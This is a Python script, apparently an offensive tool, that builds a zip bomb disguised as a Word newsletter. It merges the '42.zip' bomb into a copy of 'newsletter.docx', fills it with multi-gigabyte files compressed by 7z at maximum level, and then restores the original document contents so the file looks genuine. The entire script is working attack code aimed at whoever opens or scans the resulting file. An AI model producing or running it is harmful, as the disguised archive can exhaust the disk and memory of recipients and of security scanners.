import os, zipfile

file_count = 2

zip_file = 'newsletter.docx'
forty_two = '42.zip'
bomb_file = 'newslettergenerated.docx'
tmp_dir = '/tmp/zip_bomb'
file_name = '0.txt'

mb = 10485
# mb = 1

def create_tmp_dir():
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)

def extract_docx():
    unzip = 'unzip {} -d{}'.format(zip_file, tmp_dir)
    os.system(unzip)
    remove_dirs = 'find {} -type f -print0 | xargs -0 rm'.format(tmp_dir)
    os.system(remove_dirs)    

def copy_target_zip():
    command = 'cp {} {}'.format(forty_two, tmp_dir + "/" + bomb_file)
    os.system(command)    

def update_zip(target):
    command = 'cd {}; 7z u -mx9 {} {} -x!{}'.format(tmp_dir, target, "*", target)
    os.system(command)

def create_file():
    file_path = '{}/{}'.format(tmp_dir, file_name)
    f = open(file_path, 'w')
    # 4GB - 1byte (largest file that zip will currently compress)
    for i in range((1024 * 4) - 1):
        f.write('1' * mb)
    f.write('1' * (mb - 1))
    f.close()

def move_file(sourcedir, currentnum, targetdir, nextnum):
    command = 'mv {}/{}.txt {}/{}.txt'.format(sourcedir, currentnum, targetdir, nextnum)
    os.system(command)

def create_bomb():
    listfiles = os.listdir(tmp_dir)
    for root, dirs, _ in os.walk(tmp_dir):
        for directory in dirs:
            create_file()
            command = 'mv {}/0.txt {}/0.txt'.format(tmp_dir,root+"/"+directory)
            os.system(command)
            for num in range(file_count):
                file_name = '{}.txt'.format(root+"/"+directory,num)
                update_zip(bomb_file)

                next_num = num+1
                move_file(root+"/"+directory, num, root+"/"+directory, next_num)
            command = 'rm {}/{}.txt'.format(root+"/"+directory, file_count)
            os.system(command)

def add_other_files():
    unzip = 'unzip {} -d{}'.format(zip_file, tmp_dir)
    os.system(unzip)    
    update_zip(bomb_file)

def cleanup_temp():
    mv_newsletter = 'mv {}/{} {}'.format(tmp_dir, bomb_file, bomb_file)
    os.system(mv_newsletter)
    cleanup_mess = 'rm -rf {}'.format(tmp_dir)
    os.system(cleanup_mess)


create_tmp_dir()
extract_docx()
copy_target_zip()
create_bomb()
add_other_files()
cleanup_temp()
